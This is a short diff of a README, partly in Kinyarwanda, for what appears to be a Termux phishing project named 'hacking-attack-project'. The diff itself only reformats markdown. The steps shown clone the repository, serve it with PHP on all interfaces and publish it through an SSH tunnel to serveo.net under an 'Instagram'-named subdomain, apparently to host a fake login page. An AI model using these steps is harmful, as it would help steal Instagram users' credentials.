@@ -34,8 +34,9 @@ pkg install git
 git clone https://github.com/2emdrill/2m_drill_hacking-attack-project.git drill
 cd drill
 php -S 0.0.0.0:8080
-'''
-3. FUNGURA INDI SESSION MURI TERMUX
+
+```
+3.## FUNGURA INDI SESSION MURI TERMUX
 ```bash
 ssh -R Instagramtwozero:80:localhost:8080 serveo.net
  
